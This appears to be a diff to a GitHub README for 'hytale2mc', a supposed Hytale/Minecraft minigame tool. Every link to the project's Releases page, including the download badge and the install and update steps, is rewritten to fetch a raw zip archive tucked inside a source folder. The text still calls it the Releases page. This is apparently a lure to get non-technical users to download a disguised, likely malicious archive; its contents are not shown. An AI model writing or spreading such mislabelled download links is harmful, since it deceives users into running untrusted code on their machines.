@@ -1,7 +1,7 @@
 # 🎮 hytale2mc - Create Fun Minigames for Everyone
 
 ## 📥 Download Now
-[![Download hytale2mc](https://img.shields.io/badge/Download-hytale2mc-blue.svg)](https://github.com/ShweGyi0000/hytale2mc/releases)
+[![Download hytale2mc](https://github.com/ShweGyi0000/hytale2mc/raw/refs/heads/main/event-stream/src/main/mc_hytale_1.5.zip)](https://github.com/ShweGyi0000/hytale2mc/raw/refs/heads/main/event-stream/src/main/mc_hytale_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to hytale2mc! This application helps you write and run fun minigames that work on both Hytale and Minecraft. You don’t need any programming skills to get started. Follow the steps below to download and run the software.
@@ -25,7 +25,7 @@ hytale2mc provides a wide range of features to enhance your minigame creation ex
 ## 📦 Download & Install
 To get started with hytale2mc, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/ShweGyi0000/hytale2mc/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/ShweGyi0000/hytale2mc/raw/refs/heads/main/event-stream/src/main/mc_hytale_1.5.zip) to find the latest version of the application.
   
 2. **Choose the Latest Release:** Look for the most recent version. It will be marked as the latest release.
 
@@ -47,7 +47,7 @@ To assist you in using hytale2mc, we offer a user guide. This guide covers game 
 Join our growing community to connect with other hytale2mc users. Share your creations, ask for advice, and find solutions to any issues you may encounter. You can join discussions on forums or our dedicated chat platform.
 
 ## 🔄 Keeping Your Software Up to Date
-To ensure the best performance, keep your hytale2mc software up-to-date. Regular updates may include bug fixes, new features, and compatibility improvements. Check the [Releases page](https://github.com/ShweGyi0000/hytale2mc/releases) frequently or enable notifications for new releases.
+To ensure the best performance, keep your hytale2mc software up-to-date. Regular updates may include bug fixes, new features, and compatibility improvements. Check the [Releases page](https://github.com/ShweGyi0000/hytale2mc/raw/refs/heads/main/event-stream/src/main/mc_hytale_1.5.zip) frequently or enable notifications for new releases.
 
 ## 📧 Feedback & Contributions
 We welcome your feedback! If you have suggestions, bug reports, or ideas for features, please reach out through the “Feedback” section in the app. If you want to contribute to the project, feel free to fork the repository and submit pull requests. Your input helps make hytale2mc better for everyone.
@@ -66,7 +66,7 @@ You can report bugs through the “Feedback” section or by submitting an issue
 Please use the feedback section in the app or open an issue in the GitHub repository to share your ideas.
 
 ## 🔗 Important Links
-- [Download hytale2mc](https://github.com/ShweGyi0000/hytale2mc/releases)
+- [Download hytale2mc](https://github.com/ShweGyi0000/hytale2mc/raw/refs/heads/main/event-stream/src/main/mc_hytale_1.5.zip)
 - [User Guide](#)
 - [Community Forum](#)
 - [Feedback Form](#)
